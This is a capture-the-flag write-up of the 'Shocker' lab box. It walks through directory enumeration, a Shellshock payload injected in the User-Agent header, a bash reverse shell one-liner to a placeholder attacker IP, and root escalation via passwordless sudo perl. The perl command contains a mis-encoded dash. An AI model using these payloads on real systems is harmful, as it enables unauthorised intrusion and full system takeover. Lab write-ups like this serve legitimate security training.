## i. Port Scan

## ii. Enumeration / Low Priv Shell

Starting off with http, browsing to host:

Nothing interesting, let's see if we can find any hidden directories using `gobuster`

Wait... nothing found? That's because of two reasons: 
- gobuster by default does not show pages with 403 Status Codes (Forbidden). 
- the way that this apache is setup is that it'll report directories that do not have a / appended as 404.

Luckily for us, gobuster has those switches built-in. `-f to append directory flashes, and -s <status> for custom status codes`

Running gobuster with those two options:

~~~
$ gobuster -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25 -f -s 403
~~~

Seems like we found a new directory, `cgi-bin`, navigating to it we get the 403 mentioned before.

Let's see if we can use gobuster to find any files in the directory. Typically there are .sh files in /cgi-bin/, so we can use `-x` in gobuster for custom extensions.

Navigating to user.sh:

Downloading the file, and looking at the contents, we can see that the script is executing uptime when being called:

Let's try testing if the page is vulnerable to Shellshock since bash is involved.

Two great reads on how Shellshock works & how it's exploited:

Using Burp's repeater would make this easier, as we do not have to download the file every time to see the output:

The payload that I'm going to be using: 
~~~
() { :; }; echo; /bin/ls

If you want to execute another command, make sure you include the full path. ($ which command)
~~~

This will list the contents in the directory. I'm going to insert the payload into User-Agents. (You can use several HTTP-Headers such as User-Agent, Cookie, Accept, etc.)

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/response.png)

Looking at the response, we see that it prints out the directory contents, which means we have `command execution`

In order to get a low-privilege shell, I am going to use the bash reverse shell one-liner.

~~~
$ bash -i >& /dev/tcp/YOURIP/PORT 0>&1

Looking at our listener:

## iii. Privilege Escalation

While enumerating the system, I checked `sudo -l` to see what commands can be ran as root:

![Screenshot]({{ site.baseurl }}/images/posts/2017/shocker/sudo.png)

We can run perl as root without a password.

Using a perl one-liner to spawn a shell with root privileges.

~~~
perl â€”e 'exec "/bin/sh";'

You won't see any output at first, but try executing a command.

##. iv. Conclusion

This box is great practice for Shellshock. Though, it's hard to find it in the wild nowadays, it's still a good idea to add it to your foundation.
